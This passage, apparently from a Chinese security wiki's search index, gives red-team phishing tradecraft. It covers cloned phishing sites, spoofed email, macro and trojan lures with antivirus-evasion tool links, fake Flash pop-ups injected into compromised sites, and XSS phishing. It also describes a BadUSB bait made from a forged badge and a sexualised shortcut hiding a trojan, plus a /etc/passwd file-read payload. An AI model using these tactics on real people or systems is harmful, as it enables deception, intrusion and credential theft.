3\u3001\u51e0\u4e2a\u91cd\u8981\u56e0\u7d20\uff1a\u4eff\u9020\u7684\u7ad9\u70b9\u76ee\u6807\u3001\u76ee\u6807\u4eba\u7fa4\u3001\u8bdd\u672f\u3002\u6f02\u4eae\u7684\u6218\u672f\u5236\u5b9a\u5f80 \u5f80\u6bd4\u6280\u672f\u70b9\u7684\u6289\u62e9\u66f4\u91cd\u8981\u3002\u4f8b\u598219\u5e74\u5e95\u5230\u73b0\u5728\u76db\u884c\u7684\u88f8\u804a\u8bc8\u9a97\u5957\u8def\uff0c\u901a\u8fc7 \u4eba\u6027\u7684\u5f31\u70b9\uff0c\u6548\u679c\u663e\u8457\u3002\u518d\u4f8b\u5982\u51e0\u4e2a\u6708\u524d\u7684\u67d0\u6b21\u6f14\u7ec3\uff0c\u67d0\u53f8\u961f\u4f0d\u901a\u8fc7\u53cd\u4ee3 \u9493\u9c7c\u7684\u624b\u6cd5\uff0c\u6210\u529f\u7684\u62ff\u5230\u4e86\u76ee\u6807\u7684\u7c7b\u4f3c\u4e91\u4e3b\u673a\u7ba1\u7406\u7cfb\u7edf\u7684web\u8d26\u53f7\u5bc6\u7801\uff0c\u63a5 \u7ba1\u4e00\u5806\u865a\u62df\u4e91\u4e3b\u673a\u3002 \u642d\u5efa\u9493\u9c7c\u7f51\u7ad9\u76f8\u5173\u53c2\u8003\uff1a 1\u3001\u4e00\u952e\u90e8\u7f72HTTPS\u9493\u9c7c\u7ad9 https://github.com/klionsec/SpoofWeb 2\u3001nginx\u505a\u53cd\u5411\u4ee3\u7406-\u9493\u9c7c https://www.cnblogs.com/R4v3n/articles/8460811.html 3\u3001\u514b\u9686\u7f51\u7ad9\u795e\u5668httrack https://github.com/xroche/httrack 4\u3001\u793e\u4f1a\u5de5\u7a0b\u5b66\u5de5\u7a0b\u5305 https://github.com/trustedsec/social-engineer-toolkit 5\u3001setoolkit\u7684\u5b89\u88c5\u4e0e\u4f7f\u7528 https://www.cnblogs.com/zhangb8042/articles/10910019.html 6\u3001flash\u7684\u9493\u9c7c\u9875 https://github.com/r00tSe7en/Fake-flash.cn \u90ae\u4ef6\u4f2a\u9020\u53c2\u8003\uff1a 1\u3001Swaks\u4f2a\u9020\u90ae\u4ef6 https://payloads.online/archivers/2019-05-09/1 2\u3001Swaks - Swiss Army Knife for SMTP http://www.jetmore.org/john/code/swaks/ 3\u3001CobaltStrike \u751f\u6210Office\u5b8f\u75c5\u6bd2\u8fdb\u884c\u9493\u9c7c\u653b\u51fb Office\u5b8f\u75c5\u6bd2\u6df7\u6dc6\u514d\u6740- EvilClippy CobaltStrike \u751f\u6210exe\u6728\u9a6c\u8fdb\u884c\u9493\u9c7c\u653b\u51fb\u514d\u6740\uff1a \u514d\u6740\u53ef\u4ee5\u7528 https://github.com/1y0n/AV_Evasion_Tool \u8fd8\u6ca1\u88ab\u548c\u8c10\u592a\u591a \u6df7\u6dc6\uff1a https://jishuin.proginn.com/p/763bfbd60aa3 CobaltStrike \u751f\u6210shellcode\u8fdb\u884c\u514d\u6740\u4e0a\u7ebf 4\u3001\u6c34\u5751\u653b\u51fb-Flash\u4f2a\u88c5 \u5047\u8bbe\u5df2\u7ecf\u62ff\u5230\u4e00\u53f0\u5185\u7f51web\u5728\u7528\u670d\u52a1\u5668\u7cfb\u7edf\u6743\u9650\uff0c\u4e0a\u4f20\u4f2a\u88c5\u514d\u6740\u9a6c\u5b50\u548c\u7279\u5b9ajs\uff0c\u5047\u8bbe\u627e\u5230\u7ad9\u70b9all.js\u6587\u4ef6\uff0c\u70b9\u51fb\u7f16\u8f91\u4fee\u6539 document.write(\" \");\u6b63\u5e38\u4eba\u4f1a\u53bb\u70b9\u51fb\u4e0b\u8f7d\u6700\u65b0\u7248\u672c\uff0c\u6b64\u65f6\u4f1a\u4e0b\u8f7d\u4f2a\u88c5\u7684\u514d\u6740\u9a6c\u5b50\uff0c\u7136\u540e\u2026\u2026 https://github.com/r00tSe7en/Flash-Pop \u5b9e\u4f8b\u53c2\u8003\uff1a 1\u3001\u8bb0\u4e00\u6b21\u771f\u5b9e\u7684\u90ae\u4ef6\u9493\u9c7c\u6f14\u7ec3 https://xz.aliyun.com/t/5412","title":"\u4e00\u3001\u7a83\u53d6\u53e3\u4ee4\u7c7b"},{"location":"redteam/%E9%92%93%E9%B1%BC/#_2","text":"\u7528\u4f2a\u88c5\u7684\u7535\u90ae\uff08\u4e0d\u9650\u4e8e\u5e38\u89c1\u90ae\u4ef6\uff0c\u4e00\u4e9b\u5185\u90e8\u7684oa\uff0cerp\uff0c\u6216\u5176\u4ed6\u4f9b\u5458\u5de5 \u4f7f\u7528\u4ea4\u6d41\u5e26\u9644\u4ef6\u529f\u80fd\u7684\u7cfb\u7edf\u4ea6\u53ef\uff09\uff0c\u9644\u4ef6\u643a\u5e26excel\u5b8f\u75c5\u6bd2\uff0c\u6216\u5feb\u6377\u65b9\u5f0f\u7c7b \u6728\u9a6c\uff0c\u4ea6\u6216\u6346\u7ed1\u5728\u6b63\u5e38\u8f6f\u4ef6\u4e2d\u7684\u6728\u9a6c\u7b49\uff0c\u53d1\u9001\u7ed9\u76ee\u6807\uff0c\u7b56\u7565\u548c\u7a83\u53d6\u53e3\u4ee4\u7c7b \u4f3c\u3002\u4e0d\u63a8\u8350excel\u65b9\u5f0f\uff0cwps\u5360\u636e\u4e86\u56fd\u4eba\u5927\u90e8\u5206\u7cfb\u7edf\u3002 \u7ecf\u9a8c\u5206\u4eab\uff1a \u5404\u7c7bOA\u7cfb\u7edf\u7684\u6f0f\u6d1e\u90fd\u88ab\u4fee\u8865\u65e0\u6cd5getshell\u7684\u60c5\u51b5\u4e0b\uff0c\u4e00\u5b9a\u4e0d\u8981\u653e\u5f03\u5b83 \uff0c\u4f8b\u5982seeyon\uff0c\u4e00\u4e2a\u5f31\u53e3\u4ee4\u8fdbOA\uff0c\u518d\u63d0\u53d6\u5176\u4ed6\u7528\u6237\u7684username\u518d\u8dd1\u4e00\u53d1 \u5f31\u53e3\u4ee4\uff0c\u901a\u8fc7\u6536\u96c6\u7528\u6237\u5e73\u65f6\u5de5\u4f5c\u6765\u5f80\u4fe1\u4ef6\uff0c\u9488\u5bf9\u5176\u4ed6\u4eba\u4e0e\u8be5\u8d26\u53f7\u5e73\u65f6\u7684\u5de5 \u4f5c\u5185\u5bb9\u5236\u5b9a\u8bdd\u672f\uff0c\u5b9a\u5411\u9493\u9c7c\u3002\u4f8b\u5982\u5728\u67d0\u6b21\u7684\u9879\u76ee\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u666e\u901a\u5458 \u5de5\u5f31\u53e3\u4ee4\u8fdb\u5165\u4e86\u8be5\u53f8\u4e00\u4e2a\u5ba2\u670d\u7cfb\u7edf\uff0c\u901a\u8fc7\u4fe1\u606f\u6536\u96c6\u53d1\u73b0\u4e0a\u9762\u6709\u7f51\u7ba1\u7528\u6237\u548c \u666e\u901a\u5ba2\u670d\u4eba\u5458\uff0c\u901a\u8fc7\u9644\u4ef6\u643a\u9a6c\u7684\u65b9\u5f0f\u6210\u529f\u9493\u5230\u7ba1\u7406\u5458\uff0c\u5728\u540e\u7eed\u7684\u6df1\u5165\u4e2d\u5c31 \u65b9\u4fbf\u591a\u4e86\u3002 \u514d\u6740\u63a8\u8350\uff1a https://github.com/Rvn0xsy/BadCode https://github.com/1y0n/AV_Evasion_Tool \u6346\u7ed1\u63a8\u8350\uff1a https://github.com/TheKingOfDuck/MatryoshkaDollTool \u5b57\u5178\u63a8\u8350\uff1a https://github.com/sry309/SuperWordlist https://github.com/cwkiller/Pentest_Dic https://github.com/TheKingOfDuck/fuzzDicts \u7cbe\u5f69\u7206\u7834\u6848\u4f8b\uff1a \u4e00\u6b21\u7a0d\u663e\u66f2\u6298\u7684\u7206\u7834\u7ecf\u5386 https://www.cnblogs.com/cwkiller/p/12741086.html \u5176\u4ed6\u63a8\u8350\uff1a \u9c7c\u53c9\u653b\u51fb-\u70ae\u8f70\u9a6c\u7684\u5236\u4f5c https://mp.weixin.qq.com/s/3GLmtGoP-rG1nBBSw_KxkQ \u53d1\u4ef6\u5185\u5bb9\uff1a 1\u3001\u6295\u8bc9\u90ae\u4ef6 2\u3001\u9879\u76ee\u5408\u4f5c 3\u3001\u8d22\u52a1\u901a\u77e5 4\u3001\u6c42\u804c\u90ae\u4ef6 5\u3001\u5b98\u65b9\u901a\u544a 6\u3001\u5185\u90ae\u5185\u5bb9\u56de\u590d","title":"\u4e8c\u3001\u9644\u4ef6\u643a\u9a6c\u7c7b"},{"location":"redteam/%E9%92%93%E9%B1%BC/#0x02-xss-phishing","text":"","title":"0x02 XSS-Phishing"},{"location":"redteam/%E9%92%93%E9%B1%BC/#_3","text":"XSS\u653b\u51fb\u901a\u5e38\u6307\u7684\u662f\u901a\u8fc7\u5229\u7528\u7f51\u9875\u5f00\u53d1\u65f6\u7559\u4e0b\u7684\u6f0f\u6d1e\uff0c\u901a\u8fc7\u5de7\u5999\u7684\u65b9 \u6cd5\u6ce8\u5165\u6076\u610f\u6307\u4ee4\u4ee3\u7801\u5230\u7f51\u9875\uff0c\u4f7f\u7528\u6237\u52a0\u8f7d\u5e76\u6267\u884c\u653b\u51fb\u8005\u6076\u610f\u5236\u9020\u7684\u7f51\u9875\u7a0b \u5e8f\u3002\u8fd9\u4e9b\u6076\u610f\u7f51\u9875\u7a0b\u5e8f\u901a\u5e38\u662fJavaScript\uff0c\u4f46\u5b9e\u9645\u4e0a\u4e5f\u53ef\u4ee5\u5305\u62ecJava\uff0cVB Script\uff0cActiveX\uff0cFlash\u6216\u8005\u751a\u81f3\u662f\u666e\u901a\u7684HTML\u3002\u653b\u51fb\u6210\u529f\u540e\uff0c\u653b\u51fb\u8005\u53ef \u80fd\u5f97\u5230\u66f4\u9ad8\u7684\u6743\u9650\uff08\u5982\u6267\u884c\u4e00\u4e9b\u64cd\u4f5c\uff09\u3001\u79c1\u5bc6\u7f51\u9875\u5185\u5bb9\u3001\u4f1a\u8bdd\u548ccookie\u7b49 \u5404\u79cd\u5185\u5bb9\u3002","title":"\u4e00\u3001\u7b80\u8ff0"},{"location":"redteam/%E9%92%93%E9%B1%BC/#xss","text":"\u5728hw\u9700\u6c42\u9762\u524d\uff0c\u6ca1\u67090day\uff0c\u627e\u4e0d\u5230\u5165\u53e3\u70b9\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5b89\u6392\u4e00\u540d\u64c5 \u4e8exss\u6316\u6398\u7684\u961f\u5458\u5229\u7528\u6b64\u79cd\u65b9\u5f0f\u3002 \u4f7f\u7528xss\u5f39\u7a97\u63d0\u793a\u9493\u9c7c\u7684\u65f6\u5019\u9762\u4e34\u7684\u95ee\u9898\uff0c\u5982\u679c\u9c7c\u513f\u5df2\u4e0a\u7ebf\uff0c\u8bbf\u95ee\u8005\u8fd8\u4f1a\u6301 \u7eed\u4e0d\u65ad\u7684\u5f39\u7a97\uff0c\u5bb9\u6613\u5f15\u8d77\u9c7c\u513f\u6000\u7591\uff0c \u6743\u9650\u8bf4\u6ca1\u5c31\u6ca1\u4e86\uff0c\u8fd9\u5e76\u4e0d\u662f\u6211\u4eec\u5e0c\u671b\u770b\u5230\u7684\u7ed3\u679c\u3002 \u53c2\u8003\u6587\u7ae0 XSS\u5b9e\u4f8b\u53ca\u6316\u6398\u65b9\u6cd5 https://www.yuque.com/broken5/blog/vukwsh \u7ea2\u961f\u653b\u9632\u7cfb\u5217\u4e4b\u82b1\u5f0f\u9c7c\u7aff\u9493\u9c7c\u7bc7 https://xz.aliyun.com/t/7958 \u53c2\u8003\u5de5\u5177 XSS-Phishing https://github.com/timwhitez/XSS-Phishing XSS-Fishing2-CS https://github.com/TheKingOfDuck/XSS-Fishing2-CS \u7b56\u7565\u8865\u5145\uff1a\u6b64\u7c7b\u624b\u6cd5\u4e0d\u4ec5\u53ef\u4ee5\u8fd0\u7528\u4e8e\u5728\u6316\u5230xss\u65f6\u4f7f\u7528\uff0c\u5728\u6709webshell\u7684\u60c5 \u51b5\u4e0b\uff0c\u8fd8\u53ef\u4ee5\u4fee\u6539\u76f8\u5173\u4ee3\u7801\uff0c\u5d4c\u5165js\u6587\u4ef6\u8fdb\u884c\u5bf9\u4e2a\u4ebaPC\u7684\u9493\u9c7c\uff0c\u4f8b\u5982\u67d0\u7c7b \u6709\u8fd0\u7ef4\u7ef4\u62a4\u7684\u7ad9\u70b9\uff0c\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u9493\u8fd0\u7ef4PC\uff0c\u8fd0\u7ef4PC\u4e0a\u7684\u4e1c\u897f\u53ef\u6bd4\u81ea\u5df1\u6253 server\u673a\u6162\u6162\u63a2\u7d22\u6765\u5f97\u8fc5\u901f\u900f\u5f7b\u3002","title":"\u4e8c\u3001XSS\u9493\u9c7c"},{"location":"redteam/%E9%92%93%E9%B1%BC/#0x03-badusb","text":"","title":"0x03 BadUsb"},{"location":"redteam/%E9%92%93%E9%B1%BC/#_4","text":"BadUSB\u662f\u5229\u7528\u4f2a\u9020HID\u8bbe\u5907\u6267\u884c\u653b\u51fb\u8f7d\u8377\u7684\u4e00\u79cd\u653b\u51fb\u65b9\u5f0f\u3002HID\u8bbe\u5907\u901a\u5e38 \u6307\u7684\u5c31\u662f\u952e\u76d8\u9f20\u6807\u7b49\u4e0e\u4eba\u4ea4\u4e92\u7684\u8bbe\u5907\uff0c\u7528\u6237\u63d2\u5165BadUSB\uff0c\u5c31\u4f1a\u81ea\u52a8\u6267\u884c \u9884\u7f6e\u5728\u56fa\u4ef6\u4e2d\u7684\u6076\u610f\u4ee3\u7801\u3002 Bad\ufffeUsb\u63d2\u5165\u540e\uff0c\u4f1a\u6a21\u62df\u952e\u76d8\u9f20\u6807\u5bf9\u7535\u8111\u8fdb\u884c\u64cd\u4f5c\uff0c\u901a\u8fc7\u8fd9\u4e9b\u64cd\u4f5c\u6253\u5f00\u7535\u8111\u7684\u547d \u4ee4\u7ec8\u7aef\uff0c\u5e76\u6267\u884c\u4e00\u6761\u547d\u4ee4\uff0c\u8fd9\u6761\u547d\u4ee4\u5c06\u4ece\u6307\u5b9a\u7f51\u5740\u4e0b\u8f7d\u5176\u4ed6\u4ee3\u7801\u5e76\u4e8e\u540e\u53f0 \u9759\u9ed8\u8fd0\u884c\u3002\u8fd9\u4e9b\u4ee3\u7801\u529f\u80fd\u5305\u62ec\uff1a\u7a83\u53d6\u4fe1\u606f\u3001\u53cd\u5f39shell\u3001\u53d1\u9001\u90ae\u4ef6\u7b49\uff0c\u4ece\u800c \u5b9e\u73b0\u63a7\u5236\u76ee\u6807\u673a\u6216\u8005\u7a83\u53d6\u4fe1\u606f\u7684\u76ee\u7684\u3002","title":"\u4e00\u3001\u7b80\u8ff0"},{"location":"redteam/%E9%92%93%E9%B1%BC/#_5","text":"\u8be6\u7ec6\u7684\u5236\u4f5c\u64cd\u4f5c\u8fc7\u7a0b\u4e0d\u518d\u7d2f\u8ff0\uff0c\u53c2\u8003\u4ee5\u4e0b\u6587\u7ae0\u3002 BadUSB\u7b80\u5355\u514d\u6740\u4e00\u79d2\u4e0a\u7ebfCobaltStrike https://mp.weixin.qq.com/s/UROx1fJOmMVbmH_-UasFEQ Badusb\u521d\u8bc6 https://xz.aliyun.com/t/6435 BasUSB\u5b9e\u73b0\u540e\u53f0\u9759\u9ed8\u6267\u884c\u4e0a\u7ebfCobaltStrike https://mp.weixin.qq.com/s/pH9hcKGQHIRMxU3uDN3JUw \u7b56\u7565\u8865\u5145 1\u3001\u6478\u7d22\u5458\u5de5\u4fe1\u606f\uff0c\u4f8b\u5982\u67d0\u4e4e\uff0c\u67d0\u76f4\u8058\uff0c\u5c3d\u4e00\u5207\u4fe1\u606f\u6536\u96c6\u624b\u6bb5\uff0c\u91c7\u96c6\u5458\u5de5\u4fe1 \u606f\uff08\u5973\u6027\u5458\u5de5\u4e3a\u5b9c\uff09\u3002 2\u3001\u67d0\u5b9d\u641c\u7d22\u8d2d\u4e70\u8be5\u53f8\u5458\u5de5\u5de5\u724c\uff0c\u5e76\u5236\u4f5c\u3002 3\u3001\u5236\u4f5cbadusb\uff0c\u5e76\u5c06U\u76d8\u8d34\u4e0a\u4e00\u4e9b\u7b26\u5408\u5973\u6027\u5ba1\u7f8e\u7684\u8d34\u7eb8\u4e4b\u7c7b\uff0c\u5c06\u5176\u6302\u8f7d\u5de5 \u724c\u4e0a\u3002 4\u3001\u4e3a\u4e86\u4fdd\u9669\u8d77\u89c1\uff0c\u8bbe\u7f6e\u7b2c\u4e8c\u4e2a\u5907\u7528\u65b9\u6848\uff0c\u4f8b\u5982\uff0c\u5229\u7528\u5feb\u6377\u65b9\u5f0f\u7684\u624b\u6cd5\uff0c\u627e \u4e00\u5f20\u7537\u5973\u66a7\u6627\u7684\u56fe\u7247\u7528\u6765\u5236\u4f5c\u5feb\u6377\u65b9\u5f0f\u7684\u56fe\u6807\uff0c\u540d\u5b57\u53d6\u540d\u4e3a\u201c\u521d\u590f\u4e4b\u591c.mp4 \u201d\uff0c\u5c06\u8be5\u6587\u4ef6\u653e\u5728\u540d\u4e3a\u201c\u751c\u871c\u65f6\u523b\u201d\u6587\u4ef6\u5939\u4e0b\uff0c\u6587\u4ef6\u5939\u4e0b\u518d\u653e\u51e0\u5f20\u7f51\u7edc\u201c\u8336\u56fe\u201d\uff0c \u4e0d\u5e26\u8138\u7684\u90a3\u79cd\uff0c\u518d\u8bbe\u7f6e\u4e00\u4e2a\u9690\u85cf\u5c5e\u6027\u7684\u6587\u4ef6\u5939\uff0c\u91cc\u9762\u5b58\u653e\u81ea\u5df1\u7684\u514d\u6740\u9a6c\u3002 Attrib +s +a +h +r \u547d\u4ee4\u4ecb\u7ecd\uff1a \u663e\u793a\u6216\u66f4\u6539\u6587\u4ef6\u5c5e\u6027ATTRIB[+R|-R][+A|-A][+S|-S][+H|- H][[drive:][path]filename][/S[/D]]+\u8bbe\u7f6e\u5c5e\u6027\uff1b- \u6e05\u9664\u5c5e\u6027\uff1bR\u53ea\u8bfb\u6587\u4ef6\u5c5e\u6027\uff1bA\u5b58\u6863\u6587\u4ef6\u5c5e\u6027\uff1bS\u7cfb\u7edf\u6587\u4ef6\u5c5e\u6027\uff1bH\u9690\u85cf\u6587\u4ef6\u5c5e\u6027\uff1b \u73b0\u5728\uff0c\u6211\u4eec\u628a\u8fd9\u4e2aU\u76d8+\u5de5\u724c\u4f2a\u9020\u6210\u4e86\u67d0\u4e00\u4e2a\u5973\u6027\u5458\u5de5\u7684\u7269\u54c1\uff0c\u5e76\u5728\u5176\u4e2d\u5b58 \u653e\u4e86\u4e00\u4e9b\u4ee4\u4eba\u611f\u5174\u8da3\u7684\u4e1c\u897f\uff0c\u60f3\u8c61\u4e00\u4e0b\uff0c\u5982\u679c\u5c06\u5176\u6295\u653e\u5728\u8be5\u53f8\u67d0\u4e00\u4e2a\u5730\u65b9 \uff0c\u88ab\u5458\u5de5\u62fe\u9057\uff0c\u4f1a\u51fa\u73b0\u4ec0\u4e48\u6837\u7684\u60c5\u51b5\u3002\u3002\u3002 \u53c2\u8003\u94fe\u63a5 \u65b0\u578b\u8fdc\u63a7\u6728\u9a6c\u4e0a\u6f14\u79fb\u5f62\u6362\u5f71\u5927\u6cd5 https://www.freebuf.com/articles/system/138164.html Windows\u768412\u79cd\u5feb\u6377\u65b9\u5f0f https://www.cnblogs.com/bkclover/p/4228441.html \u7ea2\u961f\u6d3b\u52a8\u4e4bLnk\u6837\u672c\u8f7d\u8377\u7bc7 https://mp.weixin.qq.com/s/ZbtGJAT-SyZ50LRNOCg14w","title":"\u4e8c\u3001\u64cd\u4f5c"},{"location":"redteam/%E9%92%93%E9%B1%BC/#0x04","text":"\u4e00\u3001\u9644\u4ef6\u643a\u9a6c \u4e8c\u3001\u6346\u7ed1\u643a\u9a6c \u8bf4\u660e\uff1a\u4ee5\u4e0a\u6240\u6f14\u793a\u7684\u4e24\u79cd\u5b9e\u73b0\u5747\u662f\u4ece\u672c\u6587\u6240\u5217\u4e3e\u7684\u5185\u5bb9\u7ecf\u8fc7\u7ec4\u5408\u4fee\u6539\u6d4b\u8bd5 \u800c\u6210\uff0c\u4e0d\u5177\u6709\u591a\u5c11\u6280\u672f\u542b\u91cf\u3002","title":"0x04 \u5c0f\u6280\u5de7\u6f14\u793a"},{"location":"redteam/%E9%92%93%E9%B1%BC/#0x05","text":"\u793e \u5de5 \u51e0 \u4e2a \u57fa \u7840 \u70b9 \uff1a 1 \u3001 \u4fe1 \u606f \u6536 \u96c6 2 \u3001 \u7ed8 \u5236 \u4eba \u7269 \u753b \u50cf 3\u3001\u6307\u5b9a\u6218\u672f\u3002\u5728\u5b9e\u6218\u4e2d\u5e94\u5c06\u793e\u5de5\u9493\u9c7c\u878d\u5165\u6e17\u900f\u7684\u5404\u4e2a\u73af\u8282\u3002\u9ad8\u8d28\u91cf\u7684\u9488\u5bf9 \u67d0\u7c7b\u4e2a\u4f53\u9493\u9c7c\u5f80\u5f80\u6bd4\u6279\u91cf\u6d77\u9493\u7684\u6548\u679c\u6765\u7684\u66f4\u51fa\u8272\u3002 \u4e00\u7bc7\u7cbe\u5f69\u7684\u5b9e\u4f8b\u793e\u5de5 \u53cd\u8bc8\u6848\u4f8b|\u8bc8\u9a97\u56e2\u4f19\u5192\u5145\u9886\u5bfc\u5f00\u53e3\u5c31\u898198w https://mp.weixin.qq.com/s/KL6O6fqeKWue81VZTiYAFA \u9644\u4e0a\u53f2\u4e0a\u6700\u52a8\u542c\u6700\u7ecf\u5178\u7684\u539f\u7248\u97f3\u9891\uff1a\u6709\u4e3b\u673a\u4e0a\u7ebf\u8bf7\u6ce8\u610f \u7cbe\u9009\u7559\u8a00 \u7528\u6237\u8bbe\u7f6e\u4e0d\u4e0b\u8f7d\u8bc4\u8bba","title":"0x05 \u6700\u540e"},{"location":"%E5%AE%89%E5%85%A8wiki/CMS%E5%AE%89%E5%85%A8/","text":"","title":"cms\u5b89\u5168"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/","text":"\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e \u00b6 xxs\u6f0f\u6d1e \u00b6 \u53cd\u5c04\u3001dom\u3001\u5b58\u50a8 \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d \u00b6 \u5229\u7528\u6761\u4ef6:\u5b58\u5728\u8bfb\u6587\u4ef6\u7684\u51fd\u6570;\u8bfb\u53d6\u6587\u4ef6\u7684\u8def\u5f84\u7528\u6237\u53ef\u63a7\u4e14\u672a\u6821\u9a8c\u6216\u6821\u9a8c\u4e0d\u4e25; \u8f93\u51fa\u4e86\u6587\u4ef6\u5185\u5bb9\u3002 \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u548c\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6709\u7740\u76f8\u4f3c\u7684\u5730\u65b9:\u5c31\u662f\u90fd\u9700\u8981\u8def\u5f84\uff0c\u4f8b\u5982 index.php?f-file:///etc/ passwd, index.php?f= ./index.php \u77ed\u4fe1\u91cd\u7f6e\u5bc6\u7801 \u00b6 \u7ed5\u8fc7\u65b9\u5f0f","title":"web\u5b89\u5168"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#_1","text":"","title":"\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#xxs","text":"\u53cd\u5c04\u3001dom\u3001\u5b58\u50a8","title":"xxs\u6f0f\u6d1e"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#_2","text":"\u5229\u7528\u6761\u4ef6:\u5b58\u5728\u8bfb\u6587\u4ef6\u7684\u51fd\u6570;\u8bfb\u53d6\u6587\u4ef6\u7684\u8def\u5f84\u7528\u6237\u53ef\u63a7\u4e14\u672a\u6821\u9a8c\u6216\u6821\u9a8c\u4e0d\u4e25; \u8f93\u51fa\u4e86\u6587\u4ef6\u5185\u5bb9\u3002 \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u548c\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6709\u7740\u76f8\u4f3c\u7684\u5730\u65b9:\u5c31\u662f\u90fd\u9700\u8981\u8def\u5f84\uff0c\u4f8b\u5982 index.php?f-file:///etc/ passwd, index.php?f= ./index.php","title":"\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#_3","text":"\u7ed5\u8fc7\u65b9\u5f0f","title":"\u77ed\u4fe1\u91cd\u7f6e\u5bc6\u7801"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/","text":"CIA\u4e09\u5143\u7ec4 \u00b6 HTTPS\u5b9e\u73b0\u539f\u7406 \u00b6 3389\u65e0\u6cd5\u8fde\u63a5 \u00b6 arp\u5de5\u4f5c\u539f\u7406\u548c\u6b3a\u9a97 \u00b6 syn\u6d2a\u6d41 \u00b6 \u4f2a\u9020ip\u53d1\u9001\uff0csyn\u62a5 cc\u653b\u51fb \u00b6 \u540c\u6e90\u7b56\u7565 \u00b6 tcp\u4e09\u6b21\u63e1\u624b \u00b6 tcp\u548cudp\u533a\u522b \u00b6 \u591a\u7ebf\u7a0b\u591a\u8fdb\u7a0b \u00b6 ntlm\u539f\u7406 \u00b6 \u4e2d\u95f4\u4eba\u653b\u51fb\u624b\u6cd5\u53ca\u9632\u5fa1 \u00b6 pki \u516c\u53f8\u7f51\u7edc\u5b89\u5168\u5177\u4f53\u662f\u6307 \u00b6 \u5224\u65ad\u8ba1\u7b97\u673a\u79cd\u9a6c \u00b6 \u6728\u9a6c\u4f20\u64ad\u9014\u5f84 \u00b6 \u6076\u610f\u8f6f\u4ef6 \u00b6 \u7f51\u9875\u6302\u9a6c \u00b6 \u7535\u5b50\u90ae\u4ef6\u75c5\u6bd2 \u00b6 \u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u7684\u98ce\u9669 \u00b6 icmp\u534f\u8bae \u00b6 \u9632\u706b\u5899\u7684\u7c7b\u522b\u539f\u7406 \u00b6 \u8fc7\u6ee4\u3001\u5e94\u7528\u4ee3\u7406\u3001\u72b6\u6001\u68c0\u6d4b\u3001\u9ad8\u7ea7\u5e94\u7528 http\u54cd\u5e94\u72b6\u6001 \u00b6 cookie\u548csession \u00b6 get\u548cpost\u7684\u533a\u522b \u00b6 https\u548chttp \u00b6 http\u957f\u8fde\u63a5\u77ed\u8fde\u63a5 osi\u4e03\u5c42\u6a21\u578b \u00b6 SSL\u5de5\u4f5c\u539f\u7406 \u00b6","title":"\u5b89\u5168\u57fa\u7840"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#cia","text":"","title":"CIA\u4e09\u5143\u7ec4"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#https","text":"","title":"HTTPS\u5b9e\u73b0\u539f\u7406"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#3389","text":"","title":"3389\u65e0\u6cd5\u8fde\u63a5"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#arp","text":"","title":"arp\u5de5\u4f5c\u539f\u7406\u548c\u6b3a\u9a97"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#syn","text":"\u4f2a\u9020ip\u53d1\u9001\uff0csyn\u62a5","title":"syn\u6d2a\u6d41"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#cc","text":"","title":"cc\u653b\u51fb"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_1","text":"","title":"\u540c\u6e90\u7b56\u7565"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#tcp","text":"","title":"tcp\u4e09\u6b21\u63e1\u624b"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#tcpudp","text":"","title":"tcp\u548cudp\u533a\u522b"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_2","text":"","title":"\u591a\u7ebf\u7a0b\u591a\u8fdb\u7a0b"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#ntlm","text":"","title":"ntlm\u539f\u7406"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_3","text":"pki","title":"\u4e2d\u95f4\u4eba\u653b\u51fb\u624b\u6cd5\u53ca\u9632\u5fa1"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_4","text":"","title":"\u516c\u53f8\u7f51\u7edc\u5b89\u5168\u5177\u4f53\u662f\u6307"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_5","text":"","title":"\u5224\u65ad\u8ba1\u7b97\u673a\u79cd\u9a6c"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE